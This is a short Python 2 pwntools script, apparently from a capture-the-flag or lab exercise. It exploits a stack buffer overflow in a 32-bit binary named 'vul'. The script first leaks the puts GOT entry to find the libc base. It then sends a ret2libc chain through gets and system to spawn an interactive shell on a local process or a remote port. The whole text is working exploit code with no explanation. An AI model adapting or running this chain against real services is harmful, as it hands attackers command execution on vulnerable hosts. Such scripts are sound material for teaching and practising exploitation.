#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
local = 1
if local:
	p = process('./vul')
else:
	p = remote('127.0.0.1', 8888)
offset = 116
elf = ELF('./vul')
main_addr = elf.symbols['main'] # 0x080485f9
puts_plt_addr = elf.plt['puts'] # 0x08048410
puts_got_addr = elf.got['puts'] # 0x0804a018
libc = ELF('/lib32/libc.so.6') # /lib32/libc.so.6 from gcc-multilib
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
gets_offset = libc.symbols['gets']
print 'puts offset =', hex(puts_offset)
print 'system offset =', hex(system_offset)
print 'gets offset =', hex(gets_offset)
payload1 = (
	'A' * offset + # buf
	p32(puts_plt_addr) + # address of puts plt
	p32(main_addr) + # address of main
	p32(puts_got_addr) # address of puts got
)
p.sendline(payload1)
# print enhex(p.recvline())
# raw_input('>>')
base_addr = u32(p.recvline()[:4]) - puts_offset
print 'libc base =', hex(base_addr)
system_addr = base_addr + system_offset
gets_addr = base_addr + gets_offset
ret_addr = 0x080483ca
payload2 = (
	p32(ret_addr) * 50 + # ret slide
	p32(gets_addr) + # address of gets
	p32(system_addr) + # address of system
	p32(puts_got_addr) + # first arg of gets
	p32(puts_got_addr) # first arg of system
)
p.sendline(payload2)
p.interactive()
